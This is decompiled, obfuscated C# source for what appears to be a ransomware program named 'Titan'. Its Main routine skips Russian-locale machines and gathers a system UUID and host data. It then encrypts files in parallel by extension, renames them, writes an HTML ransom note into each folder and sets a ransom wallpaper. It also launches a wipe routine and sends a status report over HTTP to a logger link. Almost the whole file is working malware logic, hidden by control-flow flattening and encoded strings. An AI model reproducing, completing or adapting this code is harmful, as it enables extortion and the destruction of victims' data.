using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using _0ebc89d9;
using _39765c7e;
using _4e714608;
using _562a9e40;
using _91fed974;
using _950c89cf;
using Titan.Function;
using a92b0bd1;
using e35101e0;

namespace Titan;

internal class Program
{
	private static void Main(string[] args)
	{
		//Discarded unreachable code: IL_0049
		//IL_0122: Expected O, but got I4
		//IL_0161: Expected O, but got I4
		//IL_0280: Expected O, but got I4
		//IL_02fe: Expected O, but got I4
		if (Localization.IsRussian())
		{
			while (true)
			{
				int num = -1227936171;
				while (true)
				{
					int num2;
					switch ((uint)(num2 = _003CModule_003E.a0a155b4(num)) % 4u)
					{
					case 0u:
						break;
					case 2u:
						_003CModule_003E.Ý_0017t_0009ÿ(0);
						num = (num2 * 1775049853) ^ 0x704F6DE;
						continue;
					case 1u:
						return;
					default:
						goto end_IL_0007;
					}
					break;
				}
				continue;
				end_IL_0007:
				break;
			}
		}
		try
		{
			Data.UUID = Info.GetUUID();
			Data.PCData = Info.Set();
			Thread thread2 = default(Thread);
			while (true)
			{
				int num3 = 1517097156;
				while (true)
				{
					int num2;
					switch ((uint)(num2 = _003CModule_003E.a0a155b4(num3)) % 6u)
					{
					case 0u:
						break;
					case 1u:
						Find.Process();
						num3 = (num2 * 152463079) ^ -397624220;
						continue;
					case 4u:
						Data.goodExtensions.AddRange(_160654c1._72a48564(Data.extensions, new char[1] { ',' }));
						num3 = (num2 * 642289108) ^ -221670912;
						continue;
					case 3u:
						Data.HELPNOTE_HTML = _003CModule_003E.t_0021_009AQi(_003CModule_003E._0aa39330<string>((uint)(_003CModule_003E.a200837b("LTE0NzI0MjI0MTI=") + 9639803 - Math.Min(9639803, 19279606)), 0 + int.Parse("431257282")), Data.PCData, _003CModule_003E._0aa39330<string>((uint)(_003CModule_003E.a200837b("LTE0NzI0MjI3ODc=") + 9639803 - Math.Min(9639803, 19279606)), 0 + int.Parse("1954463500")));
						num3 = (num2 * 607438609) ^ 0x60792790;
						continue;
					case 2u:
					{
						int count = Data.Files.Count;
						ParallelOptions parallelOptions = _003CModule_003E._0019ãìl_00B4();
						e07aa4ce.c2f2cb73(parallelOptions, _003CModule_003E._0093Û_008A_005D_008E());
						_5ed6505f._04cbdaa1(0, count, parallelOptions, (Action<int>)delegate(int i)
						{
							Encrypt.Process(Data.Files[i]);
							while (true)
							{
								int num8 = -1080286972;
								while (true)
								{
									int num9;
									switch ((uint)(num9 = _003CModule_003E._85222834(num8)) % 3u)
									{
									case 2u:
										break;
									default:
										return;
									case 1u:
										goto IL_0031;
									case 0u:
										return;
									}
									break;
									IL_0031:
									_003CModule_003E.ó_0090U_003AA();
									num8 = (num9 * -1954537631) ^ 0x1A25152F;
								}
							}
						});
						num3 = -81812676;
						continue;
					}
					default:
					{
						foreach (KeyValuePair<FileInfo, string> item in Data.toRename)
						{
							try
							{
								_003CModule_003E._0024_0084hl_008A(item.Key, item.Value);
								while (true)
								{
									IL_0202:
									int num4 = 1256289672;
									while (true)
									{
										switch ((uint)(num2 = _003CModule_003E.a0a155b4(num4)) % 4u)
										{
										case 0u:
											break;
										default:
											goto end_IL_0207;
										case 1u:
										{
											int num5;
											int num6;
											if (!_003CModule_003E.Þ_008F4_0012_002B(_003CModule_003E._0013R_00A2_007D_00BE(_003CModule_003E._0026ù_00187x(item.Key), _003CModule_003E._9e15c4c7<string>((uint)(_003CModule_003E.a200837b("LTEwOTM5NjU4Mw==") + 9639803 - Math.Min(9639803, 19279606)), 0 + int.Parse("1968713648")))))
											{
												num5 = -1206605583;
												num6 = num5;
											}
											else
											{
												num5 = 2022483198;
												num6 = num5;
											}
											num4 = num5 ^ (num2 * 1585787828);
											continue;
										}
										case 2u:
											_003CModule_003E.jûIßI(_003CModule_003E._0013R_00A2_007D_00BE(_003CModule_003E._0026ù_00187x(item.Key), _003CModule_003E._0aa39330<string>((uint)(_003CModule_003E.a200837b("LTE0NzI0MjI3OTk=") + Math.Min(9639803, 19279606) - 9639803), 0 + int.Parse("395091775"))), Data.HELPNOTE_HTML);
											num4 = (num2 * -1143380541) ^ 0x5606886C;
											continue;
										case 3u:
											goto end_IL_0207;
										}
										goto IL_0202;
										continue;
										end_IL_0207:
										break;
									}
									break;
								}
							}
							catch
							{
							}
						}
						Thread thread = _5b875f58.b8513f77((ThreadStart)delegate
						{
							Wipe.Run();
						});
						while (true)
						{
							int num7 = -823625474;
							while (true)
							{
								switch ((uint)(num2 = _003CModule_003E.a0a155b4(num7)) % 7u)
								{
								case 5u:
									break;
								default:
									return;
								case 2u:
									_003CModule_003E.s_0029_009F_0028_00A7(thread);
									num7 = (num2 * 1538235051) ^ -1767178685;
									continue;
								case 0u:
									_003CModule_003E.Ý_0017t_0009ÿ(0);
									num7 = (num2 * -1289529621) ^ -994940889;
									continue;
								case 1u:
								{
									Thread thread3 = _5b875f58.b8513f77((ThreadStart)delegate
									{
										Report("", Data.Logger);
									});
									ecb689ec.f45616c9(thread3);
									_003CModule_003E._00B8n_007Ddn(thread);
									_003CModule_003E._00B8n_007Ddn(thread2);
									ecb689ec.a7ec1b09(thread3);
									num7 = -629339447;
									continue;
								}
								case 6u:
									thread2 = _5b875f58.b8513f77((ThreadStart)delegate
									{
										//IL_0042: Expected O, but got I4
										//IL_0087: Expected O, but got I4
										//IL_00cc: Expected O, but got I4
										//IL_0116: Expected O, but got I4
										Wallaper.Set(_33415a4a.c348cb2e(new string[7]
										{
											_003CModule_003E._6931997e<string>((uint)(_003CModule_003E.a200837b("MTg3MjY3Mjc3Ng==") + 3885394 - Math.Max(3885394, 1942697)), 0 + int.Parse("1742509118")),
											Data.Name,
											_003CModule_003E._49b74782<string>((uint)(_003CModule_003E.a200837b("Mjk1ODczMjM2") + 3885394 - Math.Max(3885394, 1942697)), 0 + int.Parse("1267290408")),
											Data.Version,
											_003CModule_003E._31ec1b2a<string>((uint)(_003CModule_003E.a200837b("MTI2MTU2NDcwMA==") + 3885394 - Math.Max(3885394, 1942697)), 0 + int.Parse("1673879640")),
											_003CModule_003E.Â0_0014ÛÔ(),
											_003CModule_003E._0aa39330<string>((uint)(_003CModule_003E.a200837b("LTE0NzI0MjI4MjQ=") + 3885394 - Math.Max(3885394, 1942697)), 0 + int.Parse("504234497"))
										}));
									});
									num7 = -1869516909;
									continue;
								case 3u:
									_003CModule_003E.s_0029_009F_0028_00A7(thread2);
									num7 = (num2 * -1443252203) ^ 0x1C3B9446;
									continue;
								case 4u:
									return;
								}
								break;
							}
						}
					}
					}
					break;
				}
			}
		}
		catch (Exception ex)
		{
			_483b9924._8227f70a(_193c9f92.ca7469a6((object)ex));
			Report(_193c9f92.ca7469a6((object)ex), Data.Logger);
		}
	}

	public static void Report(string Message = "", string Link = "")
	{
		//IL_005d: Expected O, but got I4
		try
		{
			HttpWebRequest obj = (HttpWebRequest)_003CModule_003E._0084_00A3_00ACÒ3(Link);
			c59fe11a._3f6133e4((WebRequest)obj, 10000);
			_7379b76c.ac52e384(obj, true);
			_8b05c6f3._3a01fa2d(obj, _003CModule_003E._6931997e<string>((uint)(_003CModule_003E.a200837b("LTgwMjQyMjU1NQ==") + 6681689 - Math.Max(6681689, 3340844)), 0 + int.Parse("2091860192")));
			_8b05c6f3._21c76037(obj, Message);
			HttpWebResponse httpWebResponse = (HttpWebResponse)_65f14dec._2b17432d((WebRequest)obj);
			while (true)
			{
				int num = -1784497738;
				while (true)
				{
					int num2;
					switch ((uint)(num2 = _003CModule_003E.a0a155b4(num)) % 3u)
					{
					case 0u:
						break;
					default:
						return;
					case 2u:
						goto IL_0095;
					case 1u:
						return;
					}
					break;
					IL_0095:
					_003CModule_003E.â_0098_00B6_007F_007B(_003CModule_003E._001Dh_00A5ô_0089(_003CModule_003E.Öæ_0099_002E_00A5(httpWebResponse), _003CModule_003E._00BBÍÕÜq(_003CModule_003E._00BB_0098_0003ý_007B(httpWebResponse))));
					num = (num2 * -1455867375) ^ 0x217B29BE;
				}
			}
		}
		catch (Exception)
		{
		}
	}
}
